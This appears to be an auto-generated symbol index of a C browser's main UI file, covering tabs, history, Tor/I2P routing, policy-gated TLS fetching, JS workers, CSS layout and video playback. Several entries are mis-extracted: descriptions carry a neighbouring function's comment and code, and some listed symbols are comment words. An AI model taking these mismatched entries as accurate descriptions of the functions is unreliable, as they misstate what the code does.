- `omni_refresh` (line 822) `static void omni_refresh(browser_window *w)` - *Recomputes the omnibox autocomplete suggestions for the current URL-bar text. Shown only while the URL bar is focused and something is typed; otherwise cleared. Pure matching: the user's own bookmarks/history first (prefs_suggest), then the * allow.conf favorites (he_suggest), deduplicated; no I/O.*
- `profile_sync` (line 853) `static void profile_sync(browser_window *w)` - *Mirrors the session's persistable choices into w->prefs and seals them to disk. Called after any preference change; with a read-only profile (absent config dir, * foreign/corrupt prefs.bin) it is memory-only, so the session still works.*
- `remember_visit` (line 870) `static void remember_visit(browser_window *w, const char *url)` - *Records a committed navigation in the persistent history (dedup + cap live in prefs). Opt-out via the "Remember history" toggle; internal pages are never * recorded. Only URLs that already passed the pre-fetch gates reach this.*
- `bookmark_toggle_current` (line 878) `static void bookmark_toggle_current(browser_window *w)` - *Records a committed navigation in the persistent history (dedup + cap live in prefs). Opt-out via the "Remember history" toggle; internal pages are never * recorded. Only URLs that already passed the pre-fetch gates reach this. static void remember_visit(browser_window *w, const char *url) { if (!w->prefs.remember_history || url == NULL) return; if (strncmp(url, "about:", 6) == 0) return; if (prefs_history_add(&w->prefs, url) == PREFS_OK && w->profile_rw) profile_save(&w->profile, &w->prefs); } /* Ctrl+B / menu: toggles a bookmark for the current page (title from the page).*
- `proxy_addr_from_env` (line 902) `static int proxy_addr_from_env(const char *envname, const char *deflt,
                          ...` - *Copies a proxy "host:port" into dst: if the env value is unset/empty the default is used; the literal "1" also means "use the default" (a convenient on-switch). Returns * 1 if the env var was set non-empty (the proxy should be enabled), else 0.*
- `init_net_config` (line 916) `static void init_net_config(browser_window *w)` - *Builds the Tor/I2P routing config from the environment (Privacy by Default: opt-in, everything off unless explicitly enabled). FREEDOM_TOR_PROXY / FREEDOM_I2P_PROXY set and enable each proxy ("1" => the default port); FREEDOM_TORIFY_CLEARNET=1 routes ordinary clearnet through Tor too. The addresses are always seeded with the defaults * so the menu toggles work even when the env vars are absent.*
- `is_https_url` (line 925) `static int is_https_url(const char *s)`
- `is_http_url` (line 929) `static int is_http_url(const char *s)`
- `host_from_url` (line 941) `static int host_from_url(const char *url, char *out, size_t outsz)` - *A plain-http URL whose realm self-authenticates (an i2p eepsite today): it is * fetched over the network (through the overlay proxy), not read as a local file. static int is_overlay_http_url(const char *s) { return is_http_url(s) && nr_realm_allows_http(nr_classify_url(s)); } /* Extract hostname from https://host[:port][/path]. Returns 0 on parse failure.*
- `input_is_interactive` (line 973) `static int input_is_interactive(int input_type)` - *An editable control gets a live text field; submit/button/hidden do not. Checkboxes, radios, and selects are interactive (click toggles/opens) but are not text-editable -- they are tracked via rebuild_inputs so clicks * dispatch to them, but they have no tf_field.*
- `input_is_editable` (line 978) `static int input_is_editable(int input_type)`
- `free_inputs` (line 985) `static void free_inputs(browser_window *w)` - *are not text-editable -- they are tracked via rebuild_inputs so clicks * dispatch to them, but they have no tf_field. static int input_is_interactive(int input_type) { return input_type == PV_IN_TEXT || input_type == PV_IN_PASSWORD || input_type == PV_IN_TEXTAREA || input_type == PV_IN_CHECKBOX || input_type == PV_IN_RADIO || input_type == PV_IN_SELECT; } static int input_is_editable(int input_type) { return input_type == PV_IN_TEXT || input_type == PV_IN_PASSWORD || input_type == PV_IN_TEXTAREA; } /* Releases the live form-control states (the array; fields are inline).*
- `free_images` (line 993) `static void free_images(browser_window *w)` - *static int input_is_editable(int input_type) { return input_type == PV_IN_TEXT || input_type == PV_IN_PASSWORD || input_type == PV_IN_TEXTAREA; } /* Releases the live form-control states (the array; fields are inline). static void free_inputs(browser_window *w) { free(w->inputs); w->inputs = NULL; w->input_count = 0; w->focused_input = -1; } /* Releases the decoded image surfaces of the current page and the array.*
- `find_image` (line 1003) `static const ui_image *find_image(const browser_window *w, const rd_block *blk)` - *w->focused_input = -1; } /* Releases the decoded image surfaces of the current page and the array. static void free_images(browser_window *w) { for (size_t i = 0; i < w->image_count; ++i) { if (w->images[i].surface != NULL) cairo_surface_destroy(w->images[i].surface); } free(w->images); w->images = NULL; w->image_count = 0; } /* The decoded image for a doc block, or NULL when it has none (blocked / failed).*
- `layout` (line 1013) `* shared by layout (row height) and paint (blit), so they cannot drift apart. */
static int image...`
- `rebuild_inputs` (line 1027) `static void rebuild_inputs(browser_window *w)` - *Builds the live editable state for the current doc: one entry per editable * control, seeded with its declared value. Aliases the doc blocks (not owned).*
- `find_input_state` (line 1052) `static ui_input_state *find_input_state(browser_window *w, const rd_block *blk)` - *if (w->inputs == NULL) return; /* fail closed: no editable fields, page still shows size_t k = 0; for (size_t i = 0; i < n; ++i) { const rd_block *b = rd_at(w->doc, i); if (b->kind != RD_INPUT || !input_is_interactive(b->input_type)) continue; ui_input_state *st = &w->inputs[k++]; st->blk = b; tf_init(&st->field); if (b->value != NULL) tf_set(&st->field, b->value); } w->input_count = k; } /* The live state for a given doc block, or NULL when it has none.*
- `clear_doc` (line 1060) `static void clear_doc(browser_window *w)` - *Releases the structured render of the previous page (text mode resumes). The * hovered link and the live form controls alias the doc, so they are cleared too.*
- `set_cache` (line 1069) `static void set_cache(browser_window *w, char *html, size_t len, const char *top)` - *Releases the structured render of the previous page (text mode resumes). The * hovered link and the live form controls alias the doc, so they are cleared too. static void clear_doc(browser_window *w) { free_inputs(w); free_images(w); if (w->doc != NULL) { rd_free(w->doc); w->doc = NULL; } w->hover_href = NULL; w->hover_cursor = CSS_CUR_UNSET; } /* Replaces the cached page source. Takes ownership of html; copies top.*
- `surface_from_pixels` (line 1080) `static cairo_surface_t *surface_from_pixels(const tab_image *img)` - *Wraps decoded ARGB32 pixels in a Cairo surface the painter can blit. Copies row by row because Cairo may use a wider stride than the tightly packed worker buffer. * Returns NULL on failure.*
- `fetch_follow_navigable` (line 1147) `static sf_status fetch_follow_navigable(const char *url, sf_config *cfg,
                        ...` - *Fetches url (following redirects) under cfg's policy, applying two navigability fallbacks in order of decreasing security: 1) If the only obstacle is a non-PQ key exchange (SF_ERR_KEM_NOT_PQ), retry with the classical-KE fallback (TLS 1.3 + full cert validation kept). Applies to every host; *downgraded = DOWNGRADE_CLASSICAL_KE on success. 2) If the host is on the user's allowlist (allowlisted != 0) and still fails, retry with the allowlist override: TLS 1.2, classical KE, weak-but-valid cert. The chain is still authenticated, so this reaches the real site over older crypto, not an impostor. *downgraded = DOWNGRADE_ALLOWLISTED on success. This is the user's sovereign escape hatch -- secure by default, not a dictatorship. A non-allowlisted host that fails Freedom's standard stays fatal (fail closed). * cfg->policy is restored before returning.*
- `GET` (line 1180) `* a GET (Zero Trust). cfg->policy is restored before returning. */
static sf_status fetch_post_na...`
- `gui_subresource_fetch` (line 1226) `static int gui_subresource_fetch(void *vctx, const char *method, const char *url,
               ...` - *tab_fetch_fn: the trusted parent's policy-checked subresource fetch for page XHR/fetch. The worker has no network; it proxied the request here. We re-apply the SAME gates a click/load gets -- https-only resolution (cross-host allowed), the host blocklist (tracker filter), realm routing (fail-closed), TLS-PQ with the navigability fallbacks -- * so a trusted page can talk to the network without ever bypassing policy.*
- `prepare_fetch` (line 1344) `static int prepare_fetch(browser_window *w, const char *url, sf_config *cfg,
                    ...` - *Builds cfg for url and applies the pre-fetch gates. Returns nonzero when the fetch may proceed (cfg and pr->allowlisted are then set); returns 0 when the request is blocked, with pr->err holding the user-facing reason (host filter or realm fail- * closed). Pure orchestration over already-tested validators (hostblock, net_realm).*
- `fetch_job_free` (line 1444) `static void fetch_job_free(fetch_job *j)`
- `stream_progress_cb` (line 1465) `static void stream_progress_cb(const uint8_t *body, size_t body_len, void *userdata)` - *Called by the fetch thread (~1/sec) with the downloaded body so far. Copies the data to the window's thread-safe streaming buffer and signals the main loop via eventfd, which triggers a progressive re-render. Runs under the * curl transfer thread, not the main thread: only touches stream_* fields.*
- `fetch_thread` (line 1489) `static void *fetch_thread(void *arg)` - *Worker body: runs the (blocking) policy-enforcing fetch, then posts the job pointer back to the event loop. Pure with respect to the window: it reads/writes only the * job and writes one pointer to the pipe.*
- `fetch_launch` (line 1537) `static int fetch_launch(browser_window *w, const char *url, const sf_config *cfg,
               ...` - *Spawns a detached worker to fetch url under cfg (already gated by prepare_fetch). The caller has bumped w->net_gen for this navigation; the job snapshots it. Returns * nonzero on success. On failure nothing is launched and the caller shows an error.*
- `load_images` (line 1594) `static void load_images(browser_window *w, tab *t, tab_fetch_fn img_fetch, void *fetch_ctx)` - *Fetches and decodes every allowed image of the current doc into w->images (one entry per RD_IMAGE block). Each fetch re-applies the full TLS/PQ/chain policy through secure_fetch (Zero Trust); decoding happens inside the still-open confined worker t, so the parent never decodes hostile image bytes. A blocked, policy- rejected, failed or undecodable (non-PNG/JPEG) image keeps surface == NULL and the placeholder is drawn. Synchronous: image loads block this render (acceptable for v1; * async fetch is future work).*
- `page_js_host_allowlisted` (line 1752) `static int page_js_host_allowlisted(const browser_window *w)` - *Resolves the JS policy for the current page's host (Secure by Default: off unless the global mode is ON or the host is on the js.conf allowlist). Pure read of the * window state; reused by render_current_ex and the Freebug REPL's lazy worker.*
- `compute_page_js` (line 1758) `static int compute_page_js(const browser_window *w)`
- `seed_session_cookies` (line 1772) `static void seed_session_cookies(tab *t, int trusted, const char *url)` - *Seeds document.cookie for the next load from the ephemeral network jar (trusted host * only); reset to none otherwise so a persistent worker never leaks stale cookies.*
- `foldback_session_cookies` (line 1785) `static void foldback_session_cookies(const char *url, const char *jar)` - *Folds a page's document.cookie jar ("a=1; b=2") back into the ephemeral network jar * one pair at a time, so JS-set session cookies reach the next request.*
- `drop_repl_worker` (line 1804) `static void drop_repl_worker(browser_window *w)` - *Drops the kept-alive REPL worker and clears the (active-tab) console transcript. Used when the active page changes WITHOUT a re-render (tab switch / new / close): * a later eval lazily rebinds the worker to the now-active page.*
- `schedule_js_tick` (line 1818) `static void schedule_js_tick(browser_window *w, int next_ms)` - *Schedules the next JS timer tick from the worker's reported smallest pending delay (tab_page.next_timer_ms; < 0 = nothing pending). The event loop fires it * through the poll timeout; a 16 ms floor keeps a 0 ms chain from busy-spinning.*
- `render_current_ex` (line 1827) `static void render_current_ex(browser_window *w, int allow_js_nav)`
- `render_current` (line 1984) `static void render_current(browser_window *w)` - *Real async timers: a fresh load resets the per-page tick budget and schedules * the first OP_TICK from the worker's reported smallest pending delay. w->js_ticks_left = JS_TICKS_PER_LOAD; schedule_js_tick(w, page.next_timer_ms); tab_page_free(&page); w->tab_worker = t; if (w->freebug != NULL) freebug_redraw(w); /* refresh the console pane if open } /* Re-render from cache without honoring JS navigation (capability/theme toggles).*
- `show_busy` (line 1991) `static void show_busy(browser_window *w)` - *Marks a request in flight and paints a frame so the spinner appears at once. The fetch now runs on a worker thread, so the event loop keeps animating the spinner * and stays responsive until deliver_fetch_result lands the page.*
- `show_fetch_error` (line 2000) `static void show_fetch_error(browser_window *w, const char *url, sf_status ss,
                  ...` - *Replaces the page with the standard "Failed to load" diagnostic for status ss on url. allowlisted tailors the hint (already retried vs. how to override). Shared by * the GET and POST async-result handlers so the message stays in one place.*
- `arrives` (line 2051) `* on screen until the result arrives (deliver_fetch_result renders it). about:blank
 * and local ...`
- `strcmp` (line 2119) `&& strcmp(auth_host_buf, w->auth_host) != 0)`
- `tab_save` (line 2180) `static void tab_save(browser_window *w)` - *Parks the active tab's live state into its slot (a shallow move: the slot and the live fields briefly alias the same allocations; the live fields are overwritten * by tab_restore before anything is freed).*
- `tab_restore` (line 2196) `static void tab_restore(browser_window *w)` - *c->bs = w->bs; c->doc = w->doc; c->caps = w->caps; c->scroll = w->scroll; c->content_total_h = w->content_total_h; c->inputs = w->inputs; c->input_count = w->input_count; c->focused_input = w->focused_input; c->images = w->images; c->image_count = w->image_count; c->cur_html = w->cur_html; c->cur_html_len = w->cur_html_len; c->cur_top = w->cur_top; c->loading = w->loading; c->hover_href = w->hover_href; c->hover_cursor = w->hover_cursor; } /* Loads the active tab's slot into the live fields (the inverse move).*
- `free_live_page` (line 2212) `static void free_live_page(browser_window *w)` - *w->bs = c->bs; w->doc = c->doc; w->caps = c->caps; w->scroll = c->scroll; w->content_total_h = c->content_total_h; w->inputs = c->inputs; w->input_count = c->input_count; w->focused_input = c->focused_input; w->images = c->images; w->image_count = c->image_count; w->cur_html = c->cur_html; w->cur_html_len = c->cur_html_len; w->cur_top = c->cur_top; w->loading = c->loading; w->hover_href = c->hover_href; w->hover_cursor = c->hover_cursor; } /* Frees the LIVE page's owned state (used when closing the foreground tab).*
- `tab_ctx_release` (line 2221) `static void tab_ctx_release(tab_ctx *c)` - *w->hover_href = c->hover_href; w->hover_cursor = c->hover_cursor; } /* Frees the LIVE page's owned state (used when closing the foreground tab). static void free_live_page(browser_window *w) { clear_doc(w);                 /* inputs, images, doc, hover_href free(w->cur_html); w->cur_html = NULL; free(w->cur_top);  w->cur_top = NULL; browser_free(&w->bs); memset(&w->bs, 0, sizeof w->bs); } /* Frees a parked (inactive) tab's owned state.*
- `tab_switch` (line 2236) `static void tab_switch(browser_window *w, int idx)` - *if (c->images != NULL) { for (size_t i = 0; i < c->image_count; ++i) if (c->images[i].surface != NULL) cairo_surface_destroy(c->images[i].surface); free(c->images); } free(c->inputs); if (c->doc != NULL) rd_free(c->doc); free(c->cur_html); free(c->cur_top); browser_free(&c->bs); memset(c, 0, sizeof *c); } /* Brings tab idx to the foreground (no network: the cached doc is restored).*
- `tab_new` (line 2255) `static void tab_new(browser_window *w, const char *url)` - *w->net_gen++; w->loading = 0; drop_repl_worker(w); /* active page changes without a render; rebind on next eval tab_save(w); w->active_tab = idx; tab_restore(w); w->menu_open = 0; w->url_bar_focused = 0; const char *u = browser_current_url(&w->bs); browser_set_url_bar(&w->bs, (u != NULL) ? u : ""); redraw(w); } /* Opens a new tab after the active one and loads url (the start page when NULL).*
- `uitab_close` (line 2287) `static void uitab_close(browser_window *w, int idx)` - *w->inputs = NULL; w->input_count = 0; w->focused_input = -1; w->images = NULL; w->image_count = 0; w->cur_html = NULL; w->cur_html_len = 0; w->cur_top = NULL; w->scroll = 0.0; w->content_total_h = 0.0; w->loading = 0; w->caps = rdp_caps_safe(); memset(&w->bs, 0, sizeof w->bs); if (browser_init(&w->bs) != BROWSER_OK) { browser_set_page(&w->bs, "Freedom", "", 0); } w->url_bar_focused = 1; do_load(w, (url != NULL) ? url : "docs/index.html"); browser_url_bar_clear(&w->bs); redraw(w); } /* Closes tab idx. Never closes the last tab (always keeps one).*
- `newtab_x` (line 2329) `static double newtab_x(const browser_window *w)` - *X of the "new tab" (+) button: right after the last tab, clamped to the reserved * slot at the right edge.*
- `tab_title` (line 2336) `static const char *tab_title(const browser_window *w, int i)` - *X of the "new tab" (+) button: right after the last tab, clamped to the reserved * slot at the right edge. static double newtab_x(const browser_window *w) { double after = (double)w->tab_count * tab_width(w); double maxx = (double)w->width - UI_TAB_NEW_W; return (after < maxx) ? after : maxx; } /* Title shown on a tab: the page title, else the URL, else a placeholder.*
- `tabbar_top` (line 2352) `static double tabbar_top(const browser_window *w)` - *Top of the tab strip: directly under the client-side titlebar (or at the surface * top under server-side decorations).*
- `toolbar_top` (line 2358) `static double toolbar_top(const browser_window *w)` - *Top of the toolbar: under the tab strip, which is always reserved. The whole * content area derives from this, so adding the strip reflows everything below it.*
- `content_geometry` (line 2365) `static void content_geometry(const browser_window *w, double *top, double *height)` - *The content area rectangle below the toolbar, in surface coordinates. The single source of truth for both painting and click hit-testing so they cannot * drift apart.*
- `content_width` (line 2391) `static double content_width(const browser_window *w)`
- `scrollbar_metrics` (line 2402) `static int scrollbar_metrics(const browser_window *w, double *track_x, double *track_y,
         ...` - *Geometry of the vertical scrollbar in surface coordinates, plus the current thumb position. Returns 0 (and leaves outputs untouched) when the content fits and no scrollbar is needed. content_total_h is the height cached by the last * paint; the track spans the content area down to the bottom edge.*
- `scrollbar_drag_to` (line 2430) `static void scrollbar_drag_to(browser_window *w)` - *Maps the current pointer Y (less the grab offset) to a scroll offset while the * thumb is being dragged, then repaints. No-op when there is no scrollbar.*
- `draw_scrollbar` (line 2447) `static void draw_scrollbar(cairo_t *cr, const browser_window *w)` - *Paints the scrollbar track and thumb. The thumb highlights while hovered or * dragged, the same affordance the toolbar buttons and links get.*
- `window_button_rects` (line 2483) `static void window_button_rects(const browser_window *w, double *min_x, double *max_x, double *cl...`
- `toolbar_rects` (line 2493) `static void toolbar_rects(const browser_window *w,
                          double *back_x, doub...` - *The reload button sits as the third left chrome button (after back/forward), at a * fixed x; callers that need it derive it here so the layout stays single-sourced. define UI_RELOAD_X (UI_BTN_W * 2.0)*
- `toolbar_button_at` (line 2509) `static ui_hot toolbar_button_at(const browser_window *w, double px, double py)` - *Which toolbar button (if any) is at (px, py). Shared by the hover highlight and * the cursor shape so they cannot drift from the click hit-test.*
- `hot_actionable` (line 2525) `static int hot_actionable(const browser_window *w, ui_hot hot)` - *A hovered button is "actionable" (gets the hand cursor) when clicking it would * do something: Go/menu always, Back/Forward only when there is history.*
- `menu_panel_rect` (line 2536) `static void menu_panel_rect(const browser_window *w, double *x, double *y,
                      ...` - *The options-menu panel rectangle (below the gear button), and its per-item row * height. The single source of truth for drawing and hit-testing the panel.*
- `ua_box_rect` (line 2552) `static void ua_box_rect(const browser_window *w, double *x, double *y,
                        do...` - *The editable User-Agent box rectangle inside the options panel. The single * source of truth for drawing and hit-testing the field.*
- `draw_text` (line 2561) `static void draw_text(cairo_t *cr, const char *s, double x, double y, int centered)`
- `rc_free` (line 2728) `static void rc_free(rc_layout *L)`
- `rc_add_box` (line 2737) `static rc_box *rc_add_box(rc_layout *L)`
- `rc_add_frag` (line 2749) `static rc_frag *rc_add_frag(rc_layout *L)`
- `rc_add_row` (line 2759) `static rc_row *rc_add_row(rc_layout *L)`
- `family_face` (line 2772) `static const char *family_face(int family)` - *Maps an author font-family bucket (css_font_family) to a Cairo toy-font family. * The engine matches no exact families, only the generic groups.*
- `content_font` (line 2789) `static void content_font(cairo_t *cr, double size, int bold, int italic, int family)`
- `set_rgb_alpha` (line 2803) `static void set_rgb_alpha(cairo_t *cr, ui_rgb c, int opacity)` - *Sets the source color, applying an author opacity (0..100) as an alpha when set * (-1 = fully opaque). Used for author text and its shadow.*
- `utf8_clen` (line 2812) `static size_t utf8_clen(const char *s, size_t n)` - *Bytes in the UTF-8 cluster starting at s[0] (1 for a stray/continuation byte), * clamped to n.*
- `draw_slice` (line 2852) `static void draw_slice(cairo_t *cr, double x, double baseline, const char *s, size_t n)` - *Draws a text slice at (x, baseline) in the current content font/source. Shapes with HarfBuzz when available; otherwise the Cairo toy API. Mirrors measure_slice * so layout and paint stay consistent for the same slice.*
- `frag_styled` (line 2865) `static int frag_styled(const rc_frag *f)` - *True if a fragment needs the per-cluster path (text-transform other than none/unset, or a non-zero letter-spacing). Otherwise the fast whole-slice path is * byte-identical to the pre-Hito-23b-6 renderer.*
- `styled_advance` (line 2872) `static double styled_advance(cairo_t *cr, const rc_frag *f)` - *Advance (px) of a fragment's text under its text-transform + letter-spacing. The current Cairo font must already be selected. Mirrors styled_draw exactly so layout * and paint stay consistent.*
- `styled_draw` (line 2888) `static void styled_draw(cairo_t *cr, double x, double baseline, const rc_frag *f)` - *Draws a fragment's text starting at (x, baseline) under its text-transform + * letter-spacing. The current Cairo font/source must already be set.*
- `block_style` (line 2904) `static void block_style(const ui_theme *th, const rd_block *b,
                        double *si...`
- `block_margins` (line 2928) `static void block_margins(const ui_theme *th, const rd_block *b,
                          double...` - *Vertical margins (px) of a block from the user-agent box model (box_style), resolved against the block's own font size (em -> px). The user-agent notice has no HTML tag, so it keeps the theme's paragraph gap as a separator and does not * regress. The single place that turns "what tag is this" into block spacing.*
- `flush_line` (line 2940) `static void flush_line(rc_layout *L, rc_state *s, const ui_theme *th)`
- `open_line` (line 2960) `static void open_line(rc_layout *L, rc_state *s)`
- `flow_emit_frag` (line 2998) `static void flow_emit_frag(rc_layout *L, rc_state *s, cairo_font_extents_t *fe,
                 ...` - *Emits one fragment at the current pen position, advancing it. Shared by the * whole-word path and the word-break split path in flow_text.*
- `flow_text` (line 3045) `static void flow_text(cairo_t *cr, rc_layout *L, rc_state *s, const ui_theme *th,
               ...` - *owning box (for the hover-cursor lookup), -1 if none.  word-break/overflow-wrap (s->break_words): a single word wider than the WHOLE line (not just the remaining space -- a normal wrap already handles that) is split at UTF-8 cluster boundaries into pieces that each fit, instead of overflowing the box edge unbroken.  text-overflow: ellipsis (s->text_overflow, only meaningful with s->nowrap: this engine does not paint overflow:hidden clipping yet, so nowrap is the only signal that the line is meant to stay on one row): once a word would push the line past content_w, the line is truncated at the cluster boundary that fits, an ellipsis is appended, and the rest of this call's text is dropped (single-line truncation; text from a LATER sibling run on the same visual line, if any, is a * known v1 gap -- see spec/css.md).*
- `flow_text_block` (line 3193) `static void flow_text_block(cairo_t *cr, const browser_window *w, rc_layout *L,
                 ...` - *Flows one text/link/notice block into L at content_w using state s. The caller sets s->bg_rgb (the block's author background, or -1) beforehand; the foreground * color and link/heading styling are derived here.*
- `effect` (line 3274) `* effect (byte-identical default). */
static int container_has_flex_items(const rd_doc *doc, size...`
- `css_align_to_bt` (line 3290) `static int css_align_to_bt(int align_kw)` - *Maps a css_align_kw (align-items/align-self) to the box_tree cross-axis alignment it drives. BASELINE/AUTO/UNSET/space-* (align-content only, never seen here) all fall back to START; STRETCH is v1-approximated as START too * (see spec/box_engine.md) -- box_tree.c's BT_ALIGN_STRETCH already does that.*
- `layout_container` (line 3298) `static void layout_container(cairo_t *cr, const browser_window *w, rc_layout *L,
                ...`
- `ITEMS` (line 3348) `* between ITEMS (not between the lines inside one item). column-reverse
     * reverses the visua...`
- `slot` (line 3426) `* layout slot (item 0 → rightmost, last item → leftmost). */
        if (head->flex_direction == ...`
- `box_edge_px` (line 3543) `static double box_edge_px(int wpx)` - *if (bt_layout(&root, content_w) != BT_OK) return; /* Translate each item's rows into its column rectangle. for (size_t j = 0; j < g; ++j) { const bt_node *kid = &kids[pos_of[j]]; for (size_t r = row_start[j]; r < row_start[j] + row_count[j]; ++r) { L->rows[r].top += base_top + kid->y; L->rows[r].x_off = kid->x; } } s->cur_top = base_top + root.h; } /* A border/outline width in px, or 0 when unset/non-positive.*
- `box_line_visible` (line 3549) `static int box_line_visible(int style)` - *True iff a border/outline style paints a line (solid..outset); none/hidden/unset * paint nothing. The fancier 3D styles collapse to solid at paint time.*
- `close_top_box` (line 3555) `static void close_top_box(rc_layout *L, rc_state *s, const ui_theme *th)` - *Closes the open block box: flushes the current line, reserves the box's bottom * padding+border, and finalizes the recorded border-box height. No-op if none open.*
- `rc_box_context` (line 3586) `static void rc_box_context(const rc_state *s, double content_w,
                           double...` - *Content rect (left, width) the current run/box is laid out in: the innermost open * box's, or the page content box when no box is open (default flat flow).*
- `children` (line 3601) `* own content rect onto the stack so its children (text or nested boxes) place inside
 * it. At t...`
- `reconcile_boxes` (line 3709) `static void reconcile_boxes(rc_layout *L, rc_state *s, const ui_theme *th,
                      ...` - *Reconciles the open-box stack so it equals block b's box path (root..b->block_id), derived from the box-def parent_id chain. Closes any open box not on the path (innermost first), then opens any path box not yet open (outermost first), nesting * each inside its parent's content rect. Bounded by RC_BOX_STACK_MAX.*
- `box_path_of` (line 3744) `static int box_path_of(const rd_doc *doc, int block_id, int *out)` - *Box path root..block_id via the box-def parent_id chain (root first), written into * out (bounded by RC_BOX_STACK_MAX). Returns the path length; block_id < 0 gives 0.*
- `band_common_box` (line 3760) `static int band_common_box(const rd_doc *doc, size_t start, size_t end)` - *The innermost box that is an ancestor (or self) of EVERY block in [start, end), via the longest common prefix of their box paths — the box a float band nests inside, so a wrapping position:relative/background panel is opened in flow and paints its * background behind the columns. -1 when the blocks share no box (top-level band).*
- `layout_float_band` (line 3782) `static void layout_float_band(cairo_t *cr, const browser_window *w, rc_layout *L,
               ...` - *Lays a float band [start, end) — a maximal run of blocks each with float_id >= 0 — side by side inside the current box context (spec/float.md). Blocks are grouped by float_id into items (document order); each item's width is its author box_w (px or % via bx_width_cap, Hito 32), and width-less items split the leftover evenly; left/right sides pack via fx_float_pack_wrap: an item that no longer fits opens a NEW band row (spec/float.md §7b), so consecutive full-width floats stack. Each item's blocks flow into its column (a fresh sub-state, like the flex per-item pass); the band height is the sum over rows of each row's tallest column. * Structure, applied by default.*
- `layout_doc` (line 3880) `static void layout_doc(cairo_t *cr, const browser_window *w, double content_w,
                  ...`
- `position_doc` (line 4075) `static void position_doc(cairo_t *cr, const browser_window *w, double content_w,
                ...` - *Stage 2: resolves out-of-flow positioning for every absolute/fixed block in the document and stores the stacking-ordered result in L->positioned. Runs after layout_doc (which has already placed in-flow blocks). The geometry arrays are built from the rc_box rects (in-flow boxes) plus a content-measurement pass for out-of-flow blocks; pv_box_defs that are not present in either get zero geometry * (the solver treats them as zero-size at the containing block's origin).*
- `input_box_width` (line 4176) `static double input_box_width(double content_w)` - *make the painter repaint the box on TOP of its rows — covering everything past the first block with the box background. So drop the in-flow (relative) boxes here; the positioned repaint pass is left with only the true out-of-flow boxes * (absolute/fixed, which layout_doc skipped so they have no rc_box). size_t keep = 0; for (size_t i = 0; i < L->npositioned; ++i) { size_t bid = L->positioned[i].box_index; if (bid < BT_MAX_POSITIONED && in_flow[bid]) continue; L->positioned[keep++] = L->positioned[i]; } L->npositioned = keep; } /* Width of a painted text-input box: the preferred width clamped to the content.*
- `select_box_width` (line 4179) `static double select_box_width(double content_w)`
- `button_box_width` (line 4185) `static double button_box_width(cairo_t *cr, const ui_theme *th, const rd_block *b,
              ...` - *} L->npositioned = keep; } /* Width of a painted text-input box: the preferred width clamped to the content. static double input_box_width(double content_w) { return (content_w < UI_INPUT_WIDTH) ? content_w : UI_INPUT_WIDTH; } static double select_box_width(double content_w) { return input_box_width(content_w); } /* Width of a painted button: its label plus horizontal padding, clamped.*
- `v_read` (line 4635) `static int v_read(int fd, void *buf, size_t n)` - *when no decoder is running (decoder_pid == 0). NULL-safe on w. /* EINTR-safe pipe write (local version of the tab.c helper). static int v_write(int fd, const void *buf, size_t n) { const uint8_t *p = (const uint8_t *)buf; size_t done = 0; while (done < n) { ssize_t w = write(fd, p + done, n - done); if (w < 0) { if (errno == EINTR) continue; return -1; } done += (size_t)w; } return 0; } /* EINTR-safe pipe read (local version of the tab.c helper).*
- `video_stop` (line 4646) `static void video_stop(browser_window *w)`
- `video_read_frame` (line 4694) `static int video_read_frame(browser_window *w)` - *Reads one decoded ARGB frame from the decoder process pipe and caches it in w->video_frame. Returns 1 if a frame was read, 0 if none available * (EAGAIN / EOF), -1 on error.*
- `video_fetch` (line 4804) `static sf_status video_fetch(const char *url, browser_window *w,
                              sf...` - *Fetches a single resource (m3u8 or TS segment) under the full policy gates: impersonation, routing, auth, navigability fallbacks. Returns 0 on success; * *resp is populated and must be freed with sf_response_free.*
- `video_play` (line 4821) `static int video_play(browser_window *w, const char *m3u8_url)` - *Starts video playback from an m3u8 playlist URL. Fetches the playlist, parses it, handles multi-variant master playlists, spawns the decoder process AND a feeder thread that downloads TS segments and writes them to the decoder pipe. The main (Wayland) thread never blocks on HTTP for video: the event loop drains decoder frames and paints. * Returns 0 on success, -1 on failure.*
- `video_stop` (line 4908) `* each segment loop so a video_stop() in the main thread (which sets it to 0
 * then calls pthrea...`
- `paint_video_row` (line 4959) `static void paint_video_row(cairo_t *cr, browser_window *w, const rd_block *blk,
                ...`
- `row_align_offset` (line 5030) `static double row_align_offset(const rc_layout *L, const rc_row *r, double content_w)` - *Horizontal shift a row's text gets from author text-align (center/right): the slack between the available width and the line's right edge. 0 for left/justify/ unset, and for non-text rows. Shared by the painter and the link hit-test so the * click target matches exactly what is drawn.*
- `upstream` (line 5064) `* upstream (see spec/css.md). */
static void box_path(cairo_t *cr, double x, double y, double w, ...`
- `paint_box_decoration` (line 5087) `static void paint_box_decoration(cairo_t *cr, const rc_box *bx, double ox, double oy)` - *Paints one block box's decoration (Hito 23b-8 Step C): box-shadow, background fill, the four borders and the outline, behind the rows it encloses. (ox, oy) is the absolute offset for the box's layout-space rect. Solid lines in v1 (dashed/dotted collapse to solid). border-radius rounds the shadow, background, outline and -- when the four borders are uniform -- the border ring; mixed per-side borders keep square corners. Content is not clipped to the rounded rect (v1). The box * decoration was gated behind caps.css upstream (render_doc).*
- `paint_content_row` (line 5217) `static void paint_content_row(cairo_t *cr, browser_window *w, const rc_layout *L,
               ...` - *Paints one laid-out row at vertical position ry. Shared by the on-screen painter and the PDF exporter so both render identically (same fonts, colours, emphasis, links and backgrounds). band_w is the full-bleed width for notice banners (the window width on screen, the page width in the PDF). show_hover draws the link * hover highlight (on screen only; suppressed when exporting).*
- `cairo_set_dash` (line 5301) `cairo_set_dash(cr, (double[])`
- `cairo_set_dash` (line 5303) `cairo_set_dash(cr, (double[])`
- `ov_box_clips` (line 5329) `static int ov_box_clips(const pv_box_def *d)` - *} if (f->overline) { double oy = fbaseline - f->font_size * UI_OVERLINE_OFFSET; cairo_move_to(cr, x0, oy); cairo_line_to(cr, x1, oy); cairo_stroke(cr); } cairo_set_dash(cr, NULL, 0, 0.0);  /* restore solid for next line } } } /* Max overflow:hidden nesting depth (anti-DoS). #define OV_MAX_DEPTH 16 /* Returns nonzero if a box clips content on either axis.*
- `ov_collect_chain` (line 5337) `static int ov_collect_chain(const rd_doc *doc, int block_id, int *out, int cap)` - *Walks the ancestor chain of block_id and collects overflow:hidden box IDs * into out[] (outermost first). Returns count, limited to OV_MAX_DEPTH.*
